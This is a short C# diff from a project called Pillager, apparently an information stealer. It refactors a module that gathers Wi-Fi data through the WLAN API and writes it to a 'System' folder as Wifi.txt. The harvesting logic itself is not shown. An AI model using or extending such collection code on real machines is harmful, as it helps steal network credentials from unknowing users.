@@ -6,10 +6,9 @@ using Pillager.Helper;
 
 namespace Pillager.SystemInfos
 {
-    internal class Wifi
+    internal class Wifi : ICommandOnce
     {
-        public static string SystemInfoName = "Wifi";
-        private static string GetMessage()
+        private string GetMessage()
         {
             const int dwClientVersion = 2;
             IntPtr clientHandle = IntPtr.Zero;
@@ -68,16 +67,16 @@ namespace Pillager.SystemInfos
             return sb.ToString();
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
-                string savepath = Path.Combine(path, SystemInfoName);
+                string savepath = Path.Combine(path, "System");
                 string wifi = GetMessage();
                 if (!string.IsNullOrEmpty(wifi))
                 {
                     Directory.CreateDirectory(savepath);
-                    File.WriteAllText(Path.Combine(savepath, SystemInfoName + ".txt"), wifi);
+                    File.WriteAllText(Path.Combine(savepath, "Wifi.txt"), wifi, Encoding.UTF8);
                 }
             }
             catch { }
